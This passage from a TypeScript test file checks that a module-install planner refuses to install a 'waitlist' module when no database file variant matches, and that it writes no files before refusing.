    const failure = await plan({
      install: ["waitlist"],
      modules: [await waitlist()],
      config: withDb([]),
    }).catch((error: unknown) => error);

    expect(isRefusal(failure)).toBeTruthy();
  });

  it("writes nothing — the refusal comes before any file lands", async () => {
    await expect(
      plan({
        install: ["waitlist"],
        modules: [await waitlist()],
        config: withDb([]),
      })
    ).rejects.toThrow(/no file variant matches/);

    await expect(pathExists(join(root, "packages", "db"))).resolves.toBeFalsy();
  });
});
